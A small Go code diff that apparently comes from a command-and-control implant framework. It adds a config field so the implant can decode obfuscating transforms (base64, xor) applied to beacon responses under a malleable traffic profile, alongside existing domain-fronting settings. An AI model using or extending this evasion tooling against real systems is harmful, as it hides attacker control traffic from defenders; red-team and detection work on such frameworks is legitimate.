@@ -39,6 +39,11 @@ type NetworkConfig struct {
 	DomainFront      string `json:"domain_front"`
 	MalleablePrepend string `json:"malleable_prepend"`
 	MalleableAppend  string `json:"malleable_append"`
+	// MalleableRespDecode carries the serialized output transforms of the
+	// active malleable profile (e.g. "base64;xor:microsoft") so the agent can
+	// reverse them on every beacon response. Empty when no profile preset is
+	// active (the agent then skips transform decoding).
+	MalleableRespDecode string `json:"malleable_resp_decode"`
 	// Request-side transforms applied by the agent to outbound beacons and
 	// stripped by the server on inbound.
 	RequestPrepend  string            `json:"request_prepend"`
